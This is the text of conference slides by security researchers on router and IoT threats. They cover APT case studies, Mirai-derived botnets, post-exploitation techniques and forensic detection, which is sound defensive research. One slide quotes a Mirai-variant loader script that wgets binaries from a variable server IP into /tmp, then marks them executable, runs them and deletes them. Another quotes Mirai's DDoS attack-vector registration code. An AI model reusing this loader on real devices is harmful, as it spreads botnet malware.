cp / zet / f9a
L A S T  E X P L O I T A T I O N
About Us
●
Researchers from TeamT5
●
Core Developer of ThreatSonar for Linux, macOS, Windows
●
We mainly focus on state of the art techniques of threat actors and
how to effectively identify them
3
Outline
4
Attack
Defense
Tool
●
LEAYA: an Embedded System Detection and Response
●
APT and Botnet Case Studies
●
Post-Exploitation Techniques
●
Identifying Threats
●
SOHO Router Vendors Security Solution
APT and Botnet Case Studies
5
BlackTech
●
Use VPN & DDNS & Virutal Host as C2 server
●
Use man-in-the-middle attack subnetwork endpoint
6
APT
https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/
Router Compromise
Attater
Router
Tartget PC 
7
APT
Compromise
https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/
Update  Interception
Update Server
Malicious File
Malicious
Update
8
APT
Update request
Interception
User
https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/
Payload Delivery
Malicious 
Update File
Compromise
9
APT
https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/
Malicious
Update
Router
Slingshot
●
Compromised Mikrotik router
●
Downloads and loads malicious DLLs when use Winbox connect to router
10
Winbox
User
Winbox
Mikrotik
Router
Slingshot
11
APT
https://www.kaspersky.com/about/press-releases/2018_slingshot
User
Winbox
Mikrotik
Router
Slingshot
12
APT
https://www.kaspersky.com/about/press-releases/2018_slingshot
User
Winbox
Mikrotik
Router
Slingshot
13
APT
https://www.kaspersky.com/about/press-releases/2018_slingshot
User
Winbox
Mikrotik
Router
Slingshot
14
APT
https://www.kaspersky.com/about/press-releases/2018_slingshot
Fancy Bear & VPNFilter (APT28)
●
VPNFilter use default Cert or 1day to exploit device
●
Infecting 500k devices.
●
Modules
○
htpx: Http Sniffer
○
ndbr: SSH utility
○
nm: arp/wireless scan
○
netfilter: DoS utility
○
portforwarding
○
socks5proxy
○
tcpvpn: reverse-tcp vpn
15
APT
https://blog.talosintelligence.com/2018/05/VPNFilter.html
16
https://blog.talosintelligence.com/2018/05/VPNFilter.html
17
https://blog.talosintelligence.com/2018/05/VPNFilter.html
VPNFilter Stage 1
●
After exploited router
○
Comproising NVRAM to add itself to crontab in NVRAM
○
Stage 1 will autorun after router reboot
18
APT
Stage 1
crontab
NVRAM
VPNFilter Stage 1
●
After exploited router
○
Comproising NVRAM to add itself to crontab in NVRAM
○
Stage 1 will autorun after router reboot
19
APT
Stage 1
crontab
NVRAM
Stage 2
C2
20
Mirai
●
Worm Propagation
●
Target: IoT Devices
●
Use default username and password
●
DDoS
●
Open Source
○
Easy to create variants of Miria
■
miori
■
Omni
■
Satori
■
TheMoon
21
Botnet
22
https://github.com/jgamblin/Mirai-Source-Code
BOOL attack_init(void)
{
int i;
add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);
add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
//add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
return TRUE;
}
23
binarys = "mips mpsl arm arm5 arm6 arm7 sh4 ppc x86 arc"
server_ip = "$SERVER_IP"
binname = "miori"
execname = "$EXECNAME"
for arch in $binarys
do
cd /tmp
wget http://$server_ip/$binname.$arch - O $execname
chmod 777 $execname
./$execname Think.PHP
rm -rf $execname
done
Default 
Username / Password
24
Default 
Username / Password
CVE-2018-20062
Default 
Username / Password
CVE-2018-20062
CVE-2018-20062
LiquorBot
●
Base on Mirai
●
Worm Propagation
●
82 Default username / password
●
Use 12 router exploits
○
Weblogic, WordPress, Drupal
●
XMR Miner
25
Botnet
https://labs.bitdefender.com/2020/01/hold-my-beer-mirai-spinoff-named-liquorbot-incorporates-cryptomining/
Cereals
●
Worm Propagation
●
D-Link NVRs and NAS 
●
1 Exploit: CVE-2014-2691
●
Install Services
○
VPN (Tinc)
○
HTTP proxy (Polipo)
○
Socks proxy (Nylon)
○
SSH daemon (Dropbear)
○
new root / remote user
●
Goal: Download Anime
26
Botnet
https://www.forcepoint.com/blog/x-labs/botnets-nas-nvr-devices
Post-Exploitation Techniques
Understanding Threats
APT
●
Persistence
●
Weak password
●
Hardcoded SSH
●
Service(ssh, telnet, 
ddns, vpn client, 
ddns , proxy)
●
C&C
Common
●
DNS Hijacking
●
Reverse Shell
●
Reverse-TCP VPN
●
Port Forwarding
●
Sniffer
●
DoS
●
Compromised 
DLL
Botnet
●
Worm
●
DDoS
●
Coin Miner
28
Network
●
HTTP Proxy
●
SOCKS
●
Port Forwarding
●
Reverse Shell
●
Reverse-TCP VPN
Control
●
Weak password
●
Hardcoded SSH
●
SSH
●
TELNET
●
DDNS
●
VPN
●
Sniffer
Intention
●
C&C
●
Worm
●
DDoS
●
Coin Miner
●
DNS Hijacking
●
Fake Binary
29
30
Conclusion of Attack
Router Interface
Web
UPNP
Telnet
Manage
service
XSS
CMD
injection
Buffer 
Overflow
Weak
password
NVRAM
cgi binary (root privileges)
31
Identify Threats
Forensic Evidences
●
Process 
○
Memory
○
Environment
●
File
○
/etc/shadow
○
Hardcoded password
○
Autoruns (crontab)
○
NVRAM
○
logs
●
Network
32
●
TMOUT=0
●
ENV=/etc/profile
●
TZ=GMT-8
●
OLDPWD=/home
Artificial Operator (ENV)
33
Process Detection
SSH_CLIENT=192.168.7.199 50589 22
USER=admin
OLDPWD=/tmp/home/root
HOME=/root
SSH_TTY=/dev/pts/0
PS1=\u@\h:\w\$ 
LOGNAME=admin
TERM=xterm-256color
PATH=/bin:/usr/bin:/sbin:/usr/sbin:/home/adm
in:/mmc/sbin:/mmc/bin:/mmc/usr/sbin:/mmc/usr
/bin:/opt/sbin:/opt/bin:/opt/usr/sbin:/opt/u
sr/bin
SHELL=/bin/sh
PWD=/tmp
SSH_CONNECTION=192.168.7.199 50589 
192.168.7.253
Suspicious Process
34